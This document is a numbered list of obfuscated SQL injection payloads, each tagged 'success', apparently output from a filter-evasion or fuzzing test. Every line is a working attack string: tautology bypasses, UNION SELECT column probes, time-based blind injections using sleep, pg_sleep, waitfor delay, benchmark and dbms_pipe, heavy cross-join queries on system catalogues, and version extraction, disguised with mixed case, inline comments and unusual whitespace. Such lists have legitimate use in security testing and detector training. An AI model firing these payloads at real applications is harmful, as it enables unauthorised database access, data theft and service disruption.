912 success '-0xa08"  )  /**/or   (  8459  =  8459 OR 8505 NOT LIKE 8505 AND 1\x0b\x0c)  *0x132a and   (  "exyw"  =  "exyw '
913 success '|| 1 IN   (  sElEct @@version  )  -- '
914 success 'select case when 7634   LIKE   0xf72 then 1 else null end-- \t$'
916 success "0x1'  )   WHeRe (Select 2157)!=2158 ANd True ANd True OR 0 && 9254   LIKE    \x0b(  SEleCt count  (  *  )   fROm rdb$fields AS t1,rdb$types As t2,rdb$collations aS t3,rdb$functions AS t4  )  -- "
917 success ' SelEct * fROM users whEre id   liKe  \x0b1.<1# union select 1,version  (    )   -- 1 '
919 success "1' where 9420   LIke\x0c  0x24cc && 8189/**/  like     (  seLeCT count  (  *  )   frOm sysibm.systables AS t1,sysibm.systables aS\x0bt2,sysibm.systables/**/AS t3  )  -- !("
921 success '1  )   WhErE 7026  =  7026 '
922 success "0x1  )   OR 0x1a89   like     (  sELECT 6793 frOm pg_sleep  (  5   )    )    AnD   (  'A1'<>'A1K' AND True AND True "
923 success 'select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 &&   (  2149 NOT LIKE 2150 OR\x0b7666 like 7667 '
925 success '0x1   )    )  \x0b && sleep  (  5  )   anD    (    (   (SeleCt 9084)   LiKe   9084 '
926 success '1   )    )    as sfan WhERe 7176  =  7176 AND 3380 LIKE 3380 anD 7017  =  7358 '
929 success "0x1'||  (  select 'ymez' froM dual WHerE 0x268e   LiKE   0x268e || 7417  =    (  selECt count  (  *  )   fRom sysibm.systables\nas t1,sysibm.systables as t2,sysibm.systables as t3  )  -- "
930 success '0x1  )   AS ewnv WhErE/**/3393  =  3393 And 2716  =    (  SELeCT count  (  *  )   fRom/**/sysusers AS sys1,sysusers aS sys2,sysusers as sys3,sysusers as sys4,sysusers AS sys5,sysusers as sys6,sysusers AS sys7  )  --  k'
932 success "1 WHEre 'Q'!='QK' "
938 success '(sELeCt\xa0(sELECt 1))  )   WHEre 0x5cf  =  (SelECt 1487) '
939 success '1"\t  )    )    AS sgln Where \'R\'=\'R\'/**/'
940 success "0x1'+  (  select hsef where 4042 LIKE 4042 OR 8673 NOT LIKE 8673 or 8421\n =    (  select/**/count  (  *  )/*x`[r8*/  from generate_series  (  0x1,5000000   )    )     )  +' "
942 success "seLeCT count  (  *\x0b )  /*|`*/FRoM generate_series/**/ (  1,(SElECt 5000000)  )   aND 'roca'   LIKE \t 'roca "
944 success "-9358' || 9887   LIKE   2569-- "
946 success "-6030%'  )   or 3038  =  3038 OR 'Tg'<>'Tg' "
947 success '1"  )   as dgzf where 4865 NOT LIKE 4866 '
948 success "0x1' and 0x23ee  =  (SELECT 0x23ee)-- 'T)wWoF"
949 success '-(SELECT 6076)"  \n)    )    or 8277   like   4757 '
950 success "1' where 8437  =/**/ 8437 and make_set  (  2200!=2201 AND True,8899  )/**/ -- "
951 success "1'+  (  select 'drvv' where '9' LIKE '9' OR 3955=3956 AND (SELECT 4354)<>4355 AND 'a3h|X' NOT LIKE 'a3h|Xh' ANd (seLecT 3580)  = \x0b  (  sELECt count  (  *  )   froM domain.domains AS t1,domain.columns AS t2,domain.tables aS\xa0t3  )  -- 3b&"
952 success 'SELeCT count/**/ (  *  )   FRoM domain.domains AS t1,domain.columns AS t2,domain.tables AS t3 && "%"   Like   " '
953 success "waitfor/**/delay/**/'0:0:5' "
955 success ' SELecT * from users wHERe id  =  1 OR @#"; /**/=  1\x0cOR 1  =  1 -- 1\t'
956 success '0x1" where 973 LIKE 973 OR 1655 NOT IN/**/(1654,1655,1656) AND 3871 IN (3870,3871,3872)/**/'
959 success '-8868"  )/**/  wHERE 5681  =  5681\x0cOR False union all SELEcT 5681,5681,5681,5681,5681,5681,5681,5681,5681,5681-- 9'
960 success "hi' or 1  =\t 1 OR 3583=3584 --/**/"
964 success "1'+  (  SElEct rdwb wHEre 2498  = \n2498 OR 2978 NOT IN (2977,2978,2979) aNd 'Kd'!='Kdv' and\x0c(SELeCt 3429)   LIKE   7639-- "
966 success "a'\t--\t"
967 success "1'+  (\n select 'vtyw' where 7966 IN (7965,7966,7967) order by 1-- "
969 success '1"  )   as xwnu wherE 6490   LIke   6490 union all\x0bSeLEcT null,null,null,null,null,null-- h'
970 success 'SeLeCt   (  caSe wHeN   (  6166   like   3364  )   ThEN 6166 eLsE cast  (  1 aS int  )  /  (  seLECT 0 froM dual  )   ENd  )  /*\n\x0bO*/fROm dual-- '
971 success "-5130'   )    )    union all SEleCt 5218,0x1462,5218,5218,5218,5218,5218,5218,5218,5218-- "
974 success "-7501'+  (  SelEcT uloc/**/WhErE 3089  =  0xc11 union all sELECT\t3089,0xc11,0xc11,3089,3089,3089,3089,3089,3089,3089-- 4"
975 success 'SeLeCt   (  CaSE/**/wHEN   (  8331   lIkE   5625  )   tHeN 8331 ELse 8331*  (  selEct 8331 FROM mysql.db  ) \x0b END \t)/**/ # Z'
976 success "(SELECT 1)'  )\x0b  as dpmh where '!' NOT LIKE '!7'\tand 5744 IN (5743,5744,5745) "
977 success '1/**/ANd sleep  (  (sELect 5)  )  # oE~`&'
979 success 'SELEct pg_sleep  (  (SElECt 0x5)  )   AnD "zhsc"   likE   "zhsc '
987 success '1" union\x0ball/*oNQ*/selECT null,null,null,null,null,null,null,null,null,null#\x0b'
988 success 'SeLect   (  case wHEn   (  9030  =  9185  )   theN/**/9030 ElSe 9030*  (  SEleCT\x0b0x2346 fROM information_schema.character_sets  )   ENd  )  # '
990 success "1'+  (  sELECT dklj WhERE 0xcc1  =  3265 "
993 success "1'  )   wHere 5871   Like   5871 OR False "
995 success "1'  )   WHEre 1115/**/ =  1115 "
1000 success '1 where 8398  =  8398 AND 7295 NOT LIKE 7296 '
1002 success "-3107'  )   wHeRe 7782   LIkE   7782 or 8571  =  8571-- "
1003 success '0x1"   )    )    aS jrld wHerE 3488   like   3488 '
1005 success "END aNd    (  \t (    \x0b(  'xzbk'/**/  LIKE   'xzbk "
1006 success '1"  )   wHeRE 1833   like   1833 '
1009 success '"  ) \x0b Or benchmark  (  10000000,MD5  (  (SELECT 0x1)/**/  )    )   # gW'
1011 success '-3321" WHErE 1603\n  LikE   1603 Or 248 lIKe 249 union all sELEcT 1603,1603,1603,1603# '
1014 success '0x1" Or\t(SELECT 8466)  /**/LIKE   benchmark  (  0x4c4b40,md5  ( \n0x694a4745   )   /**/)    '
1015 success '1/**/\x0c)   wHeRE 0xa77 \xa0 LiKE   2679 or False oR 4915  =    (  seLECT count  (  *  )  /**/from domain.domains As t1,domain.columns aS t2,domain.tables As t3  )\t -- R'
1017 success '-(SELECT 9037)%"/**/union all seLeCt\n(Select 6583)#\x0b'
1018 success "-1641' union all select/**/4835# G,"
1019 success "-(SELECT 9429)'  )   order\tby 1--\tn"
1020 success "1  )   As ekgx wHeRe 9923   liKe   9923 OR ')\t' NOT LIKE ')\t' AND True oR 8384  =  lIKe  ( /**/'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )\t   )      )    )   -- "
1021 success "0x1'  )    OR  0x1333  =    (\x0b SeLeCT count  (  *  )   FRom domain.domains AS t1,domain.columns As t2,domain.tables aS t3  )  -- "
1024 success "seLect count  (  *  )   frOm sysibm.systables as t1,sysibm.systables/**/as/**/t2,sysibm.systables AS t3 aND    (    (   'ootz' LikE 'ootz "
1025 success '0x1  )   AS hlit wHeRe 6978 NOT LIKE 6979 AND 7900 LIKE 7900 OR 0 AND True procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    ) \t   \x0b)    )     )  ,0x1  )  # <'
1028 success 'SElECT   (  caSe WheN \xa0 (  9246  =  6326  )   ThEN 9246 ELse 9246*  (  SELecT 9246 FRoM mysql.db  )   enD  )  # '
1033 success "SELeCt count  (  * \t)   fROM sysibm.systables As t1,sysibm.systables aS t2,sysibm.systables/**/as t3  )  +' "
1035 success "1'   )    )    As jtmf WHERE 3937   lIke   3937 oR False "
1036 success "-4811' /* oN4*/ )    )     )   union all SELEcT\x0c4603,4603,4603,4603,4603,4603,4603,0x11fb,4603-- "
1037 success "1'  )   aS vlwh WherE 5828 LiKE 5828 AND True oR\t0 OR\nFalse oR elt  (  (seLeCt 4156) iN (4155,4156,4157),sleep  (  5\t  )    )   # "
1038 success "1'  )   anD 2006   LIKE   2006 "
1039 success "SeLeCT count  (/*gS&U/*/\t*  )   FroM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  +' "
1040 success "0x1   )    )     )\t  Or 0x1b43   LIkE   liKe  (  'abcdefg',upper  (/**/ hex  (  randomblob  (  0x1dcd6500/0x2   )   /**/)      )    )   -- "
1041 success 'seleCT   (  Case WhEN\x0c /**/(  4780   liKE   0x1150  )   tHEn 4780 ElsE 0x12ac*  (  seleCt 4780 froM mysql.db  )   END  )  # ]BU'
1043 success "(SELECT 1)'/**/rlike sleep  (  5  )  "
1044 success 'SELeCT   (  Case WHEN   (  7822  =  4430  )   tHEN 7822 elSE (SElECT 1)/  ( \tselEct 0  )   END  )  -- '
1047 success '1/**/ )   where 6090   like   6090 OR False '
1048 success 'sElECt count  (  *  )   fRom rdb$fields As t1,rdb$types aS t2,rdb$collations aS t3,rdb$functions As t4 And/**/   (    (   0x1b41   LIKE   (SElEcT 0x1b41) '
1049 success "  )   Or sleep  (  __TIME__  )     LIKE   ' "
1050 success '-1203"/**/  )    )    or 1646 like 1646 OR \'VQ\'!=\'VQ\'-- '
1051 success '-0x253f" order\x0bby/**/1-- fN'
1053 success " select * from users where\xa0id   LIKE   '1' union select \\.#,@@VERSION -- 1' "
1054 success "1'  )   as noqp wHeRE 4042   LIKE   4042 oR 8315  =   \xa0(  sElEct count  (  *  )   fRoM sysibm.systables as t1,sysibm.systables aS t2,sysibm.systables aS t3  )  -- "
1056 success 'sELeCT CasE wHeN 8227  =  1229 tHEn 0x1 ELSe null ENd-- '
1058 success '(SELECT 1)"  )   where 0x1357  =  4951 OR False '
1059 success "1'  )   WHERE/**/837 IN (836,837,838) AnD make_set  (  8978   LiKE   8594,8594  )  -- "
1060 success " SelECt * FROM users WHErE/**/id  =  '1' Or ||/'Y'<>'YR' && (seLeCt 5231)=5231 union sELeCt 1,version  (    )   -- (SELECT 1)' "
1061 success "1'||  (  select 'brsr' where 5458\xa0 =  0x1552 AND 1 OR 959<>959 "
1063 success "SeLEcT * fRom users wHErE id   like   1 <@. oR '~*'<>'~*s' -- 1 "
1064 success '-(SELeCt 4305)   )    )     ) /**/ union all SelEcT 0x961,(SeLeCt 2401)-- '
1067 success '-5322" union all/**/selEct 6494,6494,6494,6494,6494,6494-- '
1068 success '1" WhEre 0x20c3  =\t 8387 '
1069 success "-5147  OR    (  '#u'='#u'  )  *4906 "
1070 success '-3707"   )    )     )   Or 6870 LikE 6870 OR False aND True-- '
1072 success '1"  )   where\x0b7548  = \n7548 AND 1 '
1073 success "-1587'  )   or/**/8339  =  5540 "
1074 success "1'  )   aS bzem Where 4240   like  \t4240 "
1078 success '1  )/**/  where 4780  =  4780 OR False\n'
1080 success " || '1'  \n lIKe  /**//**/'(sEleCt/**/1) "
1081 success "-4032'  )   where 5157  =  5157 OR False/**/or 1809   like   2810# d"
1084 success "1%'/*nw*/ )\x0b  union all/**/SELEcT null,null,null,null-- "
1091 success "1'+  (  select 'dhcv' WHeRE 9372  =  9372\x0cOr 8944!=8944 "
1093 success '0x1%"   )    )    order by/**/1# q'
1096 success '-4408"  ) /*VR6S*/ or 4135=0x1027 OR \'\x0b\' LIKE \'\x0bR\' and   (  "oenu"  =  "oenu '
1100 success "-6733' \x0b)   WHeRE 0xfb8   LIke   4024 union all SeLecT 4024,4024,4024,4024# A"
1101 success '-7466 where 5161  =  5161 or 3038/**/ =  3038 AND 2032<>2033 '
1102 success '(SELECT 0x1)" && elt  (  \';\' NOT LIKE \';e\',sleep  (  0x5   )    )    '
1103 success 'SELect * frOM users WHeRe id  =\x0b 0x1 +  \t(  $+  )   Or 1  =  0x1 -- 1 "'
1104 success "-0x184a' \xa0/**/)\x0b   )    Or 2236   lIKE   4469# p"
1107 success '1  )   AS cinw Where 1767<>1768 OR False OR 5625<>5625 ANd 8594  =    (  SEleCT 8594 FROM pg_sleep  (  5   )    )   -- '
1110 success 'seLECT   (  cAse WHen   (  7163   LIKE   (sEleCt 1777)  )   ThEn 0x1 ElSE 7163*  (  SeleCt 7163 FROm master..sysdatabases  ) /**/ EnD\t )  -- '
1112 success '1   )    )    As qsos WHERe 2721  =  (sEleCt 2721) rlike   (  SElECt * fRom   (  SElEcT  (  sleep  (  5   )    )     )\xa0 sgvo  )  -- r'
1115 success '1  )   WHEre 7815   liKe   7815 && 89 LIKE 89 anD 0xcdb LikE 3291 union all sElEcT null,null,null,null,null,null,null# >'
1117 success '-5963" or 6079 NOT LIKE 6080# '
1118 success '1"  )   WhErE 9438<>9439 AND True OR (SELECT 0) AND \'V>H#?\'!=\'V>H#?U\' OR 0 AnD 6537  =  dbms_pipe.receive_message  (  chr/**/ (  76  )  ||chr  (  116  )  ||chr  ( \x0b117  )  ||chr  (  65  )  ,0x5  )  -- Mm'
1119 success '1"   )   /*[~*/)     )   And 8594   LIke     (  SeLect 0x2192 frOM pg_sleep  (  5   )    )   -- \r'
1123 success "-0x642' or (SELECT 3038)   LIKE   3038 "
1124 success 'SeLECt Case wHEN 2930  =  0x1f1c tHeN 1 Else null End-- '
1126 success 'seLEct   (  Case whEN   (  5740  =  7636  )   thEN 5740 eLsE cast  (  1 As int  )  /  (  SeLect 0 fRoM dual  )   eNd  )   FroM dual-- '
1129 success "-9657'  )   as ziiq where 7725  =  7725/**/or 'U' NOT LIKE 'Uj' "
1132 success "1'+  (  select 'zohk' whERe 8073<>8074 OR 2367   LIke     (  seleCt count  ( /**/*  )   FRoM rdb$fields aS t1,rdb$types As t2,rdb$collations As t3,rdb$functions AS t4  )  -- U"
1133 success '0x1"  )   where 1635!=0x664 '
1134 success "-2190' /**/)   WhERE 0x22ba  =  0x22ba union all SelECt 8890,8890# W"
1135 success '-8933\xa0 )   aS iiyr WHEre 1974   like   1974 union all SELect 1974,1974,1974,1974,1974# '
1137 success "select count/*Q gb*/ (  * \x0c)   from\tall_users t1,all_users t2,all_users t3,all_users t4,all_users t5 AND   (  'wweo'   like   'wweo "
1139 success "1' where 9286 LIKE 9286 OR 'S' NOT LIKE 'S' union all select null,null-- }"
1140 success ' EnD ANd    (    (   "%"  =  " '
1141 success "(SELECT 1)'  )   aS nftr whERE 'l1Qr '<>'l1Qr _' AnD True Or   (  SElEcT * FrOM   (  sElEcT  (  sleep  (  0x5   )    )     )  sddo /**/)  # "
1142 success '-0xe58"   )    )    union all SElecT 6093# dq'
1143 success 'iif  (  1217   LIKE   8831,1,1/0  ) \t '
1144 success ' SELect * fROm users WHeRE id  =  1 OR "?  (  "/*m,]*/|| 1  =  1 -- 1 ov'
